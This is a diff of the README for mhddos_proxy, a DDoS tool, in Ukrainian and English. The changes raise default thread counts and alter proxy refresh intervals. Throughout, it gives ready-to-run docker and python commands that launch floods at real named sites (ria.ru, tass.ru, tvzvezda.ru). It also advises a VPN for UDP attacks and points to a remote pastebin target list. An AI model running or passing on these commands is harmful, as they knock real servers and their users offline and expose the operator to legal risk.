@@ -70,17 +70,17 @@ UDP - **ТУТ ПОТРІБНО ВКЛЮЧИТИ VPN**
 
 **УСІ ПАРАМЕТРИ МОЖНА КОМБІНУВАТИ**, можна вказувати і до і після переліку цілей
 
-Змінити навантаження - `-t XXX` - кількість потоків на кожне ядро CPU, за замовчуванням - 300
+Змінити навантаження - `-t XXXX` - кількість потоків, за замовчуванням - CPU * 1000
 
-    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 500 https://ria.ru https://tass.ru
+    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 3000 https://ria.ru https://tass.ru
 
 Щоб переглянути інформацію про хід атаки, додайте прапорець `--debug`
 
     docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --debug https://ria.ru https://tass.ru
 
-Змінити частоту оновлення проксі (за замовчуванням - кожні 10 хвилин) - `-p SECONDS`
+Змінити частоту оновлення проксі (за замовчуванням - кожні 15 хвилин) - `-p SECONDS`
 
-    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -p 900 https://ria.ru https://tass.ru
+    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -p 1200 https://ria.ru https://tass.ru
 
 Цілі з віддаленого файла конфігурації - `-c https://pastebin.com/raw/95D1jjzy`
 
@@ -107,7 +107,7 @@ UDP - **ТУТ ПОТРІБНО ВКЛЮЧИТИ VPN**
     optional arguments:
       -h, --help             show this help message and exit
       -c, --config URL       URL to a config file (list of targets in plain text)
-      -t, --threads 300      Threads per CPU core (default is 300)
+      -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
       -p, --period 900       How often to update the proxies (default is 900)
       --debug                Enable debug output from MHDDoS
       --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
@@ -182,7 +182,7 @@ Note that **python** is used instead of python3.
     
     optional arguments:
       -h, --help             show this help message and exit
-      -t, --threads 300      Threads per CPU Core (default is 300)
+      -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
       -c, --config URL       URL to a config file (list of targets in plain text)
       -p, --period 900       How often to update the proxies (default is 900)
       --debug                Enable debug output from MHDDoS
@@ -207,7 +207,7 @@ Target specification
 
 Increase load
 
-    python3 runner.py -t 500 https://tvzvezda.ru
+    python3 runner.py -t 3000 https://tvzvezda.ru
 
 View DEBUG info (traffic)
 
